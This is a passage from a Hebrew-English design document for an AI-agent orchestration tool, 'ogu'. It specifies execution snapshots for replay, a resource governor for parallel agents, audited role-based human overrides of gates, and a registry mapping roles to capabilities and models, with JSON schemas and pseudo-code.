  allocated → in_progress│ 2026-02-22 09:00 │ first_task_started │ build
```

**כלל ברזל:** שום שינוי state לא קורה בלי transition מוגדר. Transition שלא ב-schema = OGU2802.

---

### Fix 3: Execution Snapshot Layer (Determinism אמיתי)

**הבעיה:** Determinism מוגדר כעיקרון אבל לא כמנגנון. בלי seed קבוע, model version pinning, input snapshot, ו-tool output snapshot — replay ייכשל ולא תדע למה.

**קבצים חדשים:**

```
.ogu/snapshots/                              ← Snapshot directory
.ogu/snapshots/{featureSlug}/                ← Per-feature snapshots
.ogu/snapshots/{featureSlug}/{taskId}.json   ← Per-task execution snapshot
tools/ogu/commands/lib/execution-snapshot.mjs ← Snapshot capture & verify
tools/ogu/commands/snapshot.mjs              ← CLI: snapshot:capture, snapshot:verify, snapshot:diff
```

**Schema: ExecutionSnapshot**

```json
{
  "$schema": "ExecutionSnapshot/1.0",
  "id": "snapshot-uuid",
  "capturedAt": "ISO",
  "featureSlug": "auth-system",
  "taskId": "task-3",

  "environment": {
    "nodeVersion": "v22.0.0",
    "platform": "darwin-arm64",
    "oguVersion": "1.0.0",
    "cliVersion": "1.5.0"
  },

  "model": {
    "provider": "anthropic",
    "modelId": "claude-sonnet-4-6-20250514",
    "modelVersion": "claude-sonnet-4-6-20250514",
    "temperature": 0,
    "maxTokens": 200000,
    "systemPromptHash": "sha256",
    "toolsEnabled": ["Read", "Write", "Edit", "Bash", "Glob", "Grep"]
  },

  "inputs": {
    "specHash": "sha256",
    "planHash": "sha256",
    "planTaskHash": "sha256 — hash of the specific task definition",
    "contextLockHash": "sha256",
    "orgSpecHash": "sha256",
    "modelConfigHash": "sha256",
    "policiesHash": "sha256",
    "repoCommitBefore": "git-sha",
    "inputArtifactHashes": {
      "SCHEMA:users": "sha256 — hash of resolved input artifact"
    }
  },

  "execution": {
    "promptHash": "sha256 — hash of full prompt sent to model",
    "tokensIn": 45678,
    "tokensOut": 12345,
    "toolCalls": [
      {
        "order": 1,
        "tool": "Read",
        "inputHash": "sha256",
        "outputHash": "sha256",
        "durationMs": 50
      },
      {
        "order": 2,
        "tool": "Edit",
        "inputHash": "sha256",
        "outputHash": "sha256",
        "durationMs": 30
      }
    ],
    "totalToolCalls": 15,
    "durationMs": 45000,
    "escalations": 0,
    "retries": 0
  },

  "outputs": {
    "repoCommitAfter": "git-sha",
    "artifactsProduced": [
      {
        "identifier": "API:/users POST",
        "fileHash": "sha256",
        "path": "src/api/users/route.ts"
      }
    ],
    "gateResults": {
      "typecheck": "passed",
      "unit_tests": "passed"
    },
    "success": true
  },

  "nonDeterministicEvents": [
    {
      "type": "model_response_variation",
      "description": "Model chose different variable name than previous run",
      "severity": "cosmetic",
      "affectsOutput": false
    }
  ],

  "replayable": true,
  "replayRequirements": {
    "exactModelVersion": "claude-sonnet-4-6-20250514",
    "exactTemperature": 0,
    "exactPrompt": true,
    "exactInputs": true,
    "notes": "Replay with same model version and temperature=0 should produce functionally equivalent output"
  }
}
```

**Pseudo-code: execution-snapshot.mjs**

```javascript
// tools/ogu/commands/lib/execution-snapshot.mjs

import { createHash } from 'crypto';
import { readFileSync, writeFileSync, mkdirSync } from 'fs';
import { execSync } from 'child_process';
import { join } from 'path';

/**
 * Capture a complete execution snapshot BEFORE task begins
 * Returns a snapshot builder that collects data during execution
 */
export function beginSnapshot(root, { featureSlug, taskId, modelConfig, planTask }) {
  const snapshot = {
    id: generateId(),
    capturedAt: new Date().toISOString(),
    featureSlug,
    taskId,
    environment: captureEnvironment(),
    model: {
      provider: modelConfig.provider,
      modelId: modelConfig.model,
      modelVersion: modelConfig.fullModelId,
      temperature: 0, // enforce determinism
      maxTokens: modelConfig.maxTokens || 200000,
      systemPromptHash: null, // set when prompt is built
      toolsEnabled: modelConfig.tools || []
    },
    inputs: {
      specHash: hashFile(join(root, `docs/vault/04_Features/${featureSlug}/Spec.md`)),
      planHash: hashFile(join(root, `docs/vault/04_Features/${featureSlug}/Plan.json`)),
      planTaskHash: hashObject(planTask),
      contextLockHash: hashFile(join(root, '.ogu/CONTEXT_LOCK.json')),
      orgSpecHash: hashFile(join(root, '.ogu/OrgSpec.json')),
      modelConfigHash: hashFile(join(root, '.ogu/model-config.json')),
      policiesHash: hashFile(join(root, '.ogu/governance/policies.json')),
      repoCommitBefore: getGitHead(root),
      inputArtifactHashes: {}
    },
    execution: {
      promptHash: null,
      tokensIn: 0,
      tokensOut: 0,
      toolCalls: [],
      totalToolCalls: 0,
      durationMs: 0,
      escalations: 0,
      retries: 0
    },
    outputs: {
      repoCommitAfter: null,
      artifactsProduced: [],
      gateResults: {},
      success: false
    },
    nonDeterministicEvents: [],
    replayable: true
  };

  // Hash input artifacts
  for (const input of planTask.inputs || []) {
    const artifact = resolveArtifact(root, featureSlug, input);
    if (artifact) {
      snapshot.inputs.inputArtifactHashes[input] =
        artifact.files?.[0]?.hash || 'unresolved';
    }
  }

  return {
    snapshot,

    setPromptHash(hash) {
      snapshot.model.systemPromptHash = hash;
      snapshot.execution.promptHash = hash;
    },

    recordToolCall(tool, inputHash, outputHash, durationMs) {
      snapshot.execution.toolCalls.push({
        order: snapshot.execution.toolCalls.length + 1,
        tool, inputHash, outputHash, durationMs
      });
      snapshot.execution.totalToolCalls++;
    },

    recordNonDeterminism(event) {
      snapshot.nonDeterministicEvents.push(event);
      if (event.affectsOutput) {
        snapshot.replayable = false;
      }
    },

    finalize({ success, tokensIn, tokensOut, durationMs, artifacts, gateResults }) {
      snapshot.execution.tokensIn = tokensIn;
      snapshot.execution.tokensOut = tokensOut;
      snapshot.execution.durationMs = durationMs;
      snapshot.outputs.repoCommitAfter = getGitHead(root);
      snapshot.outputs.artifactsProduced = artifacts || [];
      snapshot.outputs.gateResults = gateResults || {};
      snapshot.outputs.success = success;

      // Write snapshot
      const dir = join(root, '.ogu/snapshots', featureSlug);
      mkdirSync(dir, { recursive: true });
      writeFileSync(
        join(dir, `${taskId}.json`),
        JSON.stringify(snapshot, null, 2)
      );

      return snapshot;
    }
  };
}

/**
 * Verify replay: compare two snapshots for determinism
 */
export function verifyReplay(snapshot1, snapshot2) {
  const diffs = [];

  // Input determinism — must match exactly
  for (const key of Object.keys(snapshot1.inputs)) {
    if (JSON.stringify(snapshot1.inputs[key]) !== JSON.stringify(snapshot2.inputs[key])) {
      diffs.push({
        layer: 'input',
        field: key,
        expected: snapshot1.inputs[key],
        actual: snapshot2.inputs[key],
        severity: 'breaking'
      });
    }
  }

  // Model determinism — version must match
  if (snapshot1.model.modelVersion !== snapshot2.model.modelVersion) {
    diffs.push({
      layer: 'model',
      field: 'modelVersion',
      expected: snapshot1.model.modelVersion,
      actual: snapshot2.model.modelVersion,
      severity: 'breaking'
    });
  }

  // Output determinism — functional equivalence
  const outputs1 = new Set(snapshot1.outputs.artifactsProduced.map(a => a.identifier));
  const outputs2 = new Set(snapshot2.outputs.artifactsProduced.map(a => a.identifier));
  const missingOutputs = [...outputs1].filter(o => !outputs2.has(o));
  const extraOutputs = [...outputs2].filter(o => !outputs1.has(o));

  if (missingOutputs.length > 0) {
    diffs.push({ layer: 'output', field: 'missingArtifacts', artifacts: missingOutputs, severity: 'breaking' });
  }
  if (extraOutputs.length > 0) {
    diffs.push({ layer: 'output', field: 'extraArtifacts', artifacts: extraOutputs, severity: 'warning' });
  }

  return {
    deterministic: diffs.filter(d => d.severity === 'breaking').length === 0,
    functionallyEquivalent: diffs.filter(d => d.layer === 'output').length === 0,
    diffs
  };
}

function captureEnvironment() {
  return {
    nodeVersion: process.version,
    platform: `${process.platform}-${process.arch}`,
    oguVersion: '1.0.0', // from package.json
    cliVersion: execSync('claude --version 2>/dev/null || echo unknown').toString().trim()
  };
}

function hashFile(path) {
  try {
    return createHash('sha256').update(readFileSync(path)).digest('hex').slice(0, 16);
  } catch { return 'missing'; }
}

function hashObject(obj) {
  return createHash('sha256').update(JSON.stringify(obj)).digest('hex').slice(0, 16);
}

function getGitHead(root) {
  try {
    return execSync('git rev-parse HEAD', { cwd: root }).toString().trim().slice(0, 12);
  } catch { return 'unknown'; }
}
```

**CLI Commands:**

```
ogu snapshot:capture <slug> <taskId>    ← Manual snapshot capture
ogu snapshot:verify <slug> <taskId>     ← Compare against previous snapshot
ogu snapshot:diff <snap1> <snap2>       ← Diff two snapshots
ogu snapshot:list <slug>                ← List all snapshots for feature
```

**כלל ברזל:** כל execution שלא מייצרת snapshot נחשבת non-auditable. ה-snapshot הוא ה-receipt.

---

### Fix 4: Resource Governor

**הבעיה:** Concurrency הוא לוגי (waves/DAG) אבל לא תשתיתי. שני agents שמריצים `npm install` במקביל, או swarm שפותח 10 processes, יגרמו לקריסה.

**קבצים חדשים:**

```
.ogu/resource-governor.json                  ← Resource limits configuration
tools/ogu/commands/lib/resource-governor.mjs ← Resource tracking & enforcement
```

**Schema: resource-governor.json**

```json
{
  "$schema": "ResourceGovernor/1.0",
  "limits": {
    "maxParallelAgents": 3,
    "maxParallelModelCalls": 2,
    "maxParallelBuilds": 1,
    "maxParallelTests": 2,
    "maxWorktrees": 5,
    "maxMemoryMb": 4096,
    "maxCpuPercent": 80
  },
  "queuing": {
    "policy": "fifo | priority | shortest-first",
    "maxQueueSize": 20,
    "queueTimeoutMs": 600000,
    "priorityRules": [
      { "condition": "task.onCriticalPath", "priority": 10 },
      { "condition": "task.riskTier == 'critical'", "priority": 8 },
      { "condition": "task.escalated", "priority": 9 },
      { "condition": "default", "priority": 5 }
    ]
  },
  "resourceTypes": {
    "model_call": {
      "maxConcurrent": 2,
      "cooldownMs": 500,
      "description": "Concurrent LLM API calls"
    },
    "build": {
      "maxConcurrent": 1,
      "mutuallyExclusive": ["test_integration"],
      "description": "npm build / compile processes"
    },
    "test_unit": {
      "maxConcurrent": 2,
      "description": "Unit test runners"
    },
    "test_integration": {
      "maxConcurrent": 1,
      "mutuallyExclusive": ["build"],
      "description": "Integration / E2E tests"
    },
    "worktree": {
      "maxConcurrent": 5,
      "description": "Git worktree instances"
    },
    "npm_install": {
      "maxConcurrent": 1,
      "lockFile": ".ogu/locks/npm.lock",
      "description": "npm/pnpm install (single-writer)"
    }
  }
}
```

**Pseudo-code: resource-governor.mjs**

```javascript
// tools/ogu/commands/lib/resource-governor.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { writeFileSync, unlinkSync, existsSync, mkdirSync } from 'fs';
import { join } from 'path';

const CONFIG_PATH = '.ogu/resource-governor.json';
const LOCKS_DIR = '.ogu/locks';
const ACTIVE_PATH = '.ogu/locks/active.json';

/**
 * Request a resource slot
 * Returns { granted, waitMs, position } or blocks until available
 */
export function acquireResource(root, { resourceType, agentId, taskId, priority = 5 }) {
  const config = loadConfig(root);
  const resourceDef = config.resourceTypes[resourceType];
  if (!resourceDef) throw new Error(`OGU2901: Unknown resource type: ${resourceType}`);

  const active = loadActive(root);

  // Count current usage of this resource type
  const currentCount = active.slots.filter(s => s.resourceType === resourceType).length;

  // Check mutual exclusivity
  const mutuallyExclusive = resourceDef.mutuallyExclusive || [];
  const conflicting = active.slots.filter(s => mutuallyExclusive.includes(s.resourceType));

  if (currentCount >= resourceDef.maxConcurrent || conflicting.length > 0) {
    // Resource busy — queue
    const position = enqueue(root, { resourceType, agentId, taskId, priority });
    return {
      granted: false,
      waitMs: estimateWait(active, resourceType, position),
      position,
      reason: conflicting.length > 0
        ? `Blocked by mutually exclusive: ${conflicting[0].resourceType}`
        : `${currentCount}/${resourceDef.maxConcurrent} slots used`
    };
  }

  // Grant
  const slot = {
    id: generateId(),
    resourceType,
    agentId,
    taskId,
    acquiredAt: new Date().toISOString(),
    priority
  };
  active.slots.push(slot);
  saveActive(root, active);

  return { granted: true, slotId: slot.id };
}

/**
 * Release a resource slot
 */
export function releaseResource(root, slotId) {
  const active = loadActive(root);
  active.slots = active.slots.filter(s => s.id !== slotId);
  saveActive(root, active);

  // Check queue — grant to next waiting
  processQueue(root);
}

/**
 * Get current resource usage
 */
export function resourceStatus(root) {
  const config = loadConfig(root);
  const active = loadActive(root);

  return Object.entries(config.resourceTypes).map(([type, def]) => {
    const used = active.slots.filter(s => s.resourceType === type).length;
    const queued = active.queue?.filter(q => q.resourceType === type).length || 0;
    return {
      type,
      used,
      max: def.maxConcurrent,
      queued,
      available: def.maxConcurrent - used,
      description: def.description
    };
  });
}

/**
 * Global concurrency check before starting any wave
 */
export function canStartWave(root, wave) {
  const config = loadConfig(root);
  const active = loadActive(root);
  const currentAgents = active.slots.filter(s => s.resourceType === 'model_call').length;

  if (currentAgents + wave.tasks.length > config.limits.maxParallelAgents) {
    return {
      canStart: false,
      reason: `Wave needs ${wave.tasks.length} agents but only ${config.limits.maxParallelAgents - currentAgents} slots available`,
      suggestion: `Split wave or wait for ${wave.tasks.length - (config.limits.maxParallelAgents - currentAgents)} agents to finish`
    };
  }

  return { canStart: true };
}

function loadActive(root) {
  mkdirSync(join(root, LOCKS_DIR), { recursive: true });
  return readJsonSafe(join(root, ACTIVE_PATH)) || { slots: [], queue: [] };
}

function saveActive(root, active) {
  writeFileSync(join(root, ACTIVE_PATH), JSON.stringify(active, null, 2));
}

function enqueue(root, request) {
  const active = loadActive(root);
  active.queue = active.queue || [];
  active.queue.push({ ...request, enqueuedAt: new Date().toISOString() });
  // Sort by priority (highest first)
  active.queue.sort((a, b) => b.priority - a.priority);
  saveActive(root, active);
  return active.queue.findIndex(q => q.taskId === request.taskId) + 1;
}

function processQueue(root) {
  const active = loadActive(root);
  if (!active.queue?.length) return;

  const config = loadConfig(root);

  // Try to grant queued requests
  const newQueue = [];
  for (const request of active.queue) {
    const def = config.resourceTypes[request.resourceType];
    const currentCount = active.slots.filter(s => s.resourceType === request.resourceType).length;

    if (currentCount < def.maxConcurrent) {
      active.slots.push({
        id: generateId(),
        ...request,
        acquiredAt: new Date().toISOString()
      });
    } else {
      newQueue.push(request);
    }
  }
  active.queue = newQueue;
  saveActive(root, active);
}
```

**CLI: `ogu resource:status`**
```
Usage: ogu resource:status

Example:
  $ ogu resource:status
  RESOURCE         USED/MAX   QUEUED   STATUS
  model_call       2/2        1        ██████████ FULL (1 waiting)
  build            0/1        0        ░░░░░░░░░░ free
  test_unit        1/2        0        █████░░░░░ 50%
  test_integration 0/1        0        ░░░░░░░░░░ free
  worktree         3/5        0        ██████░░░░ 60%
  npm_install      0/1        0        ░░░░░░░░░░ free

  AGENTS: 2/3 active
  QUEUE: 1 task waiting (task-7, priority 8)
```

**Integration with agent-runtime.mjs:**

```javascript
// Before executing agent task:
const slot = acquireResource(root, {
  resourceType: 'model_call',
  agentId: roleId,
  taskId,
  priority: isOnCriticalPath ? 10 : 5
});

if (!slot.granted) {
  // Wait or queue — don't start until resource is available
  await waitForSlot(root, slot);
}

// After task completes:
releaseResource(root, slot.slotId);
```

**כלל ברזל:** שום agent לא מתחיל execution בלי resource slot. Queue policy קובעת סדר עדיפויות.

---

### Fix 5: Formal Override Handling

**הבעיה:** Human override קיים (validation override, architect override) אבל לא מבודד — לא ברור אם הוא משאיר trace, פוגע ב-determinism, או מותר לכל role.

**קובץ חדש:** `docs/vault/02_Contracts/Override.contract.md`

**Schema: OverrideRecord**

```json
{
  "$schema": "Override/1.0",
  "id": "override-uuid",
  "timestamp": "ISO",
  "type": "validation_skip | gate_skip | model_force | budget_extend | governance_bypass | state_force | spec_deviation",

  "scope": {
    "featureSlug": "auth-system",
    "taskId": "task-3",
    "gate": "contracts",
    "affectedArtifacts": ["API:/users POST"]
  },

  "authority": {
    "role": "cto",
    "reason": "Legacy API requires non-standard response format",
    "justification": "Documented in ADR_0042.md",
    "expiresAt": "ISO | null — null means permanent",
    "adrReference": "ADR_0042"
  },

  "impact": {
    "determinismBroken": true,
    "gatesSkipped": ["contracts"],
    "invariantsViolated": ["API responses must follow standard schema"],
    "riskAssessment": "medium — limited to legacy endpoints, isolated scope"
  },

  "conditions": {
    "validUntil": "ISO | null",
    "validForFeatures": ["auth-system"],
    "mustRevalidateOn": ["spec_change", "contract_change"],
    "autoRevokeOn": "feature_archived"
  },

  "auditEventId": "links to audit trail"
}
```

**Override Permission Matrix:**

```json
{
  "permissions": {
    "validation_skip": {
      "allowedRoles": ["tech-lead", "cto"],
      "requiresADR": false,
      "requiresComment": true,
      "maxDuration": "24h",
      "auditLevel": "warning"
    },
    "gate_skip": {
      "allowedRoles": ["cto"],
      "requiresADR": true,
      "requiresComment": true,
      "maxDuration": "permanent",
      "auditLevel": "critical"
    },
    "model_force": {
      "allowedRoles": ["tech-lead", "architect", "cto"],
      "requiresADR": false,
      "requiresComment": true,
      "maxDuration": "session",
      "auditLevel": "info"
    },
    "budget_extend": {
      "allowedRoles": ["tech-lead", "cto"],
      "requiresADR": false,
      "requiresComment": true,
      "maxDuration": "24h",
      "auditLevel": "warning"
    },
    "governance_bypass": {
      "allowedRoles": ["cto"],
      "requiresADR": true,
      "requiresComment": true,
      "maxDuration": "permanent",
      "auditLevel": "critical"
    },
    "state_force": {
      "allowedRoles": ["cto"],
      "requiresADR": true,
      "requiresComment": true,
      "maxDuration": "permanent",
      "auditLevel": "critical"
    },
    "spec_deviation": {
      "allowedRoles": ["architect", "cto"],
      "requiresADR": true,
      "requiresComment": true,
      "maxDuration": "permanent",
      "auditLevel": "warning"
    }
  }
}
```

**Pseudo-code: override.mjs**

```javascript
// tools/ogu/commands/lib/override.mjs

import { audit } from './audit.mjs';
import { loadOrgSpec } from './agent-registry.mjs';
import { writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';

const OVERRIDES_DIR = '.ogu/governance/overrides';
const PERMISSIONS_PATH = 'docs/vault/02_Contracts/Override.contract.md';

/**
 * Request an override
 * Validates authority, creates record, emits audit event
 */
export function requestOverride(root, {
  type, scope, authorityRole, reason, justification, adrReference
}) {
  const orgSpec = loadOrgSpec(root);
  const permissions = loadOverridePermissions();

  // 1. Validate authority
  const perm = permissions[type];
  if (!perm) throw new Error(`OGU2951: Unknown override type: ${type}`);
  if (!perm.allowedRoles.includes(authorityRole)) {
    throw new Error(`OGU2952: Role '${authorityRole}' not authorized for '${type}' override. ` +
      `Allowed: ${perm.allowedRoles.join(', ')}`);
  }

  // 2. Check ADR requirement
  if (perm.requiresADR && !adrReference) {
    throw new Error(`OGU2953: Override type '${type}' requires ADR reference`);
  }

  // 3. Check comment requirement
  if (perm.requiresComment && !reason) {
    throw new Error(`OGU2954: Override type '${type}' requires reason`);
  }

  // 4. Create override record
  const record = {
    id: generateId(),
    timestamp: new Date().toISOString(),
    type,
    scope,
    authority: {
      role: authorityRole,
      reason,
      justification: justification || null,
      expiresAt: calculateExpiry(perm.maxDuration),
      adrReference: adrReference || null
    },
    impact: assessOverrideImpact(type, scope),
    conditions: {
      validUntil: calculateExpiry(perm.maxDuration),
      validForFeatures: scope.featureSlug ? [scope.featureSlug] : ['*'],
      mustRevalidateOn: ['spec_change', 'contract_change'],
      autoRevokeOn: 'feature_archived'
    }
  };

  // 5. Write record
  mkdirSync(join(root, OVERRIDES_DIR), { recursive: true });
  writeFileSync(
    join(root, OVERRIDES_DIR, `${record.id}.json`),
    JSON.stringify(record, null, 2)
  );

  // 6. Emit audit event (marked as non-deterministic)
  record.auditEventId = audit.emitAudit(root, {
    type: 'override_applied',
    agentId: authorityRole,
    featureSlug: scope.featureSlug,
    taskId: scope.taskId,
    context: {
      overrideType: type,
      reason,
      determinismBroken: record.impact.determinismBroken,
      gatesSkipped: record.impact.gatesSkipped
    },
    tags: ['override', 'non-deterministic', perm.auditLevel]
  });

  return record;
}

/**
 * Check if an active override exists for a given context
 */
export function checkOverride(root, { type, featureSlug, taskId, gate }) {
  const overrides = loadActiveOverrides(root);

  return overrides.find(o =>
    o.type === type &&
    (!o.conditions.validUntil || new Date(o.conditions.validUntil) > new Date()) &&
    (o.conditions.validForFeatures.includes('*') || o.conditions.validForFeatures.includes(featureSlug)) &&
    (!gate || o.scope.gate === gate || !o.scope.gate)
  ) || null;
}

/**
 * Revoke an override
 */
export function revokeOverride(root, overrideId, reason) {
  // Mark as revoked, emit audit event
}

/**
 * List all active overrides
 */
export function listOverrides(root, { includeExpired = false } = {}) {
  // Read all override files, filter by active/expired
}

function assessOverrideImpact(type, scope) {
  const impacts = {
    validation_skip: { determinismBroken: false, gatesSkipped: [], invariantsViolated: [] },
    gate_skip: { determinismBroken: true, gatesSkipped: [scope.gate], invariantsViolated: [] },
    model_force: { determinismBroken: true, gatesSkipped: [], invariantsViolated: [] },
    budget_extend: { determinismBroken: false, gatesSkipped: [], invariantsViolated: [] },
    governance_bypass: { determinismBroken: true, gatesSkipped: [], invariantsViolated: ['governance_policy'] },
    state_force: { determinismBroken: true, gatesSkipped: [], invariantsViolated: ['state_machine'] },
    spec_deviation: { determinismBroken: true, gatesSkipped: [], invariantsViolated: ['spec_contract'] }
  };
  return { ...impacts[type], riskAssessment: 'requires review' };
}

function calculateExpiry(maxDuration) {
  if (maxDuration === 'permanent') return null;
  if (maxDuration === 'session') return null; // cleared on session end
  const hours = parseInt(maxDuration);
  if (isNaN(hours)) return null;
  return new Date(Date.now() + hours * 3600000).toISOString();
}
```

**CLI Commands:**

```
ogu override <type> --feature <slug> --reason "..." [--adr ADR_XXXX] [--role cto]
ogu override:list [--active] [--expired]
ogu override:revoke <id> --reason "..."
ogu override:check --type <type> --feature <slug>
```

**Example:**
```
$ ogu override gate_skip --feature auth-system --gate contracts --reason "Legacy API format" --adr ADR_0042 --role cto
✓ Override created: ovr-abc123
  Type:     gate_skip
  Gate:     contracts
  By:       cto
  ADR:      ADR_0042
  Expires:  permanent
  ⚠ DETERMINISM BROKEN — marked as non-deterministic event
  ⚠ AUDIT LEVEL: critical
```

**Integration with gates/compile:**

```javascript
// In compile.mjs, before running a gate:
const override = checkOverride(root, {
  type: 'gate_skip',
  featureSlug: slug,
  gate: gateName
});

if (override) {
  console.warn(`⚠ Gate '${gateName}' SKIPPED by override ${override.id} (${override.authority.role})`);
  // Record as non-deterministic in snapshot
  snapshotBuilder.recordNonDeterminism({
    type: 'gate_override',
    description: `Gate '${gateName}' skipped by ${override.authority.role}: ${override.authority.reason}`,
    severity: 'structural',
    affectsOutput: true
  });
  continue; // skip gate
}
```

**כלל ברזל:** Override = Artifact מסוג OverrideRecord. כל override מסומן כ-non-deterministic event, מתועד ב-audit, ודורש authority מוכחת.

---

### Fix 6: Capability Registry (הפרדת Capability מ-Provider)

**הבעיה:** ה-Model Router מנתב לפי role → model. אבל role הוא ישות ארגונית, ו-model הוא ישות טכנית. מה שחסר באמצע: **Capability** — היכולת הספציפית שנדרשת (review, generate, analyze, verify). בלי שכבה הזו, החלפת ספק (Anthropic → OpenAI → Gemini) דורשת שינוי ב-OrgSpec/roles — וזה שובר את ה-model-agnostic promise.

**קבצים חדשים:**

```
.ogu/capabilities.json                          ← Capability registry
tools/ogu/commands/lib/capability-registry.mjs   ← Capability matching & resolution
tools/ogu/commands/capability.mjs                ← CLI: capability:list, capability:test, capability:bench
docs/vault/02_Contracts/Capability.contract.md   ← Capability system contract
```

**Schema: capabilities.json**

```json
{
  "$schema": "CapabilityRegistry/1.0",

  "capabilities": [
    {
      "id": "architect_review",
      "name": "Architecture Review",
      "description": "Evaluate code structure, patterns, dependencies, and architectural decisions",
      "category": "review",
      "requiredTraits": ["reasoning", "code_understanding", "long_context"],
      "minTier": 2,
      "preferredTier": 3,
      "benchmarkPrompt": "Review this module for architectural issues: {sample}",
      "successCriteria": "Identifies at least 3 structural concerns with severity ratings"
    },
    {
      "id": "code_generation",
      "name": "Code Generation",
      "description": "Generate production-quality code from spec and task definition",
      "category": "generation",
      "requiredTraits": ["coding", "tool_use", "instruction_following"],
      "minTier": 2,
      "preferredTier": 2,
      "benchmarkPrompt": "Implement a REST endpoint for {resource} with CRUD operations",
      "successCriteria": "Code compiles, passes typecheck, follows project patterns"
    },
    {
      "id": "code_refactor",
      "name": "Code Refactoring",
      "description": "Restructure existing code without changing behavior",
      "category": "generation",
      "requiredTraits": ["coding", "code_understanding", "reasoning"],
      "minTier": 2,
      "preferredTier": 3,
      "benchmarkPrompt": "Refactor this module to use dependency injection: {sample}",
      "successCriteria": "All existing tests pass, code complexity reduced"
    },
    {
      "id": "security_audit",
      "name": "Security Audit",
      "description": "Analyze code for OWASP vulnerabilities, auth issues, secret exposure",
      "category": "analysis",
      "requiredTraits": ["reasoning", "code_understanding", "security_knowledge"],
      "minTier": 3,
      "preferredTier": 3,
      "benchmarkPrompt": "Audit this auth module for vulnerabilities: {sample}",
      "successCriteria": "Identifies injection, auth bypass, and data exposure risks"
    },
    {
      "id": "test_generation",
      "name": "Test Generation",
      "description": "Generate unit, integration, and E2E test suites",
      "category": "generation",
      "requiredTraits": ["coding", "test_reasoning"],
      "minTier": 1,
      "preferredTier": 2,
      "benchmarkPrompt": "Write tests for this module covering edge cases: {sample}",
      "successCriteria": "Tests compile, run, achieve >80% coverage"
    },
    {
      "id": "static_analysis",
      "name": "Static Analysis",
      "description": "Detect code smells, complexity issues, dead code, type errors",
      "category": "analysis",
      "requiredTraits": ["code_understanding"],
      "minTier": 1,
      "preferredTier": 1,
      "benchmarkPrompt": "Analyze this file for code quality issues: {sample}",
      "successCriteria": "Reports complexity score, dead code, naming violations"
    },
    {
      "id": "spec_writing",
      "name": "Specification Writing",
      "description": "Write PRD, technical spec, or QA plan from requirements",
      "category": "documentation",
      "requiredTraits": ["reasoning", "instruction_following", "long_context"],
      "minTier": 2,
      "preferredTier": 2,
      "benchmarkPrompt": "Write a technical spec for: {feature_description}",
      "successCriteria": "Spec covers all requirements, has acceptance criteria"
    },
    {
      "id": "design_review",
      "name": "Design Review",
      "description": "Evaluate visual design, token compliance, accessibility",
      "category": "review",
      "requiredTraits": ["vision", "design_knowledge"],
      "minTier": 2,
      "preferredTier": 3,
      "benchmarkPrompt": "Review this component against design tokens: {screenshot}",
      "successCriteria": "Identifies token violations, contrast issues, spacing errors"
    }
  ],

  "providerCapabilities": {
    "anthropic": {
      "claude-haiku-4-5": {
        "tier": 1,
        "traits": ["coding", "instruction_following", "code_understanding"],
        "strengths": ["fast", "cost-effective", "simple-tasks"],
        "weaknesses": ["complex-reasoning", "long-context-recall"],
        "costFactor": 1.0
      },
      "claude-sonnet-4-6": {
        "tier": 2,
        "traits": ["coding", "reasoning", "code_understanding", "tool_use", "instruction_following", "test_reasoning", "long_context"],
        "strengths": ["balanced", "coding", "general-purpose"],
        "weaknesses": ["deep-security-analysis"],
        "costFactor": 3.0
      },
      "claude-opus-4-6": {
        "tier": 3,
        "traits": ["coding", "reasoning", "code_understanding", "tool_use", "instruction_following", "security_knowledge", "design_knowledge", "long_context", "vision", "test_reasoning"],
        "strengths": ["complex-reasoning", "architecture", "security", "nuance"],
        "weaknesses": ["cost", "latency"],
        "costFactor": 15.0
      }
    },
    "openai": {
      "gpt-4o-mini": {
        "tier": 1,
        "traits": ["coding", "instruction_following"],
        "strengths": ["fast", "cost-effective"],
        "weaknesses": ["complex-reasoning", "tool-use-reliability"],
        "costFactor": 0.5
      },
      "gpt-4o": {
        "tier": 2,
        "traits": ["coding", "reasoning", "code_understanding", "tool_use", "vision"],
        "strengths": ["balanced", "vision"],
        "weaknesses": ["long-context-recall"],
        "costFactor": 5.0
      },
      "o3": {
        "tier": 3,
        "traits": ["reasoning", "code_understanding", "security_knowledge", "long_context"],
        "strengths": ["deep-reasoning", "math", "complex-analysis"],
        "weaknesses": ["tool-use", "latency", "cost"],
        "costFactor": 20.0
      }
    }
  },

  "roleCapabilityMap": {
    "pm":           ["spec_writing"],
    "architect":    ["architect_review", "spec_writing"],
    "designer":     ["design_review"],
    "backend-dev":  ["code_generation", "code_refactor", "test_generation"],
    "frontend-dev": ["code_generation", "code_refactor", "test_generation", "design_review"],
    "qa":           ["test_generation", "static_analysis"],
    "security":     ["security_audit", "static_analysis"],
    "devops":       ["code_generation", "static_analysis"],
    "tech-lead":    ["architect_review", "code_refactor", "security_audit"]
  }
}
```

**The Routing Chain (3 layers):**

```
Role → Capability → Model

Example:
  "backend-dev" (role)
    → needs "code_generation" (capability for current task)
      → requiredTraits: ["coding", "tool_use", "instruction_following"]
      → minTier: 2
      → budget allows tier 2
      → "claude-sonnet-4-6" has all required traits at tier 2
      → SELECTED: anthropic/claude-sonnet-4-6

  "security" (role)
    → needs "security_audit" (capability for current task)
      → requiredTraits: ["reasoning", "code_understanding", "security_knowledge"]
      → minTier: 3
      → only tier-3 models have "security_knowledge" trait
      → budget allows tier 3
      → SELECTED: anthropic/claude-opus-4-6

  Same "security" role, but budget exhausted:
    → needs "security_audit"
      → budget only allows tier 2
      → tier 2 models LACK "security_knowledge" trait
      → CAPABILITY MISMATCH → escalate to Kadima for rebudget or human override
```

**Pseudo-code: capability-registry.mjs**

```javascript
// tools/ogu/commands/lib/capability-registry.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { join } from 'path';

const CAPABILITIES_PATH = '.ogu/capabilities.json';

/**
 * Resolve the best model for a role + capability combination
 *
 * This replaces the direct role→model mapping in model-router.
 * Now: role → capability → required traits → best matching model
 */
export function resolveCapability(root, {
  roleId, capabilityId, budgetTier, preferredProvider
}) {
  const registry = loadCapabilities(root);

  // 1. Find capability definition
  const capability = registry.capabilities.find(c => c.id === capabilityId);
  if (!capability) throw new Error(`OGU3001: Unknown capability: ${capabilityId}`);

  // 2. Validate role has this capability
  const roleCapabilities = registry.roleCapabilityMap[roleId] || [];
  if (!roleCapabilities.includes(capabilityId)) {
    throw new Error(`OGU3002: Role '${roleId}' does not have capability '${capabilityId}'`);
  }

  // 3. Determine target tier (respect budget constraints)
  const targetTier = Math.min(capability.preferredTier, budgetTier || 3);
  if (targetTier < capability.minTier) {
    return {
      resolved: false,
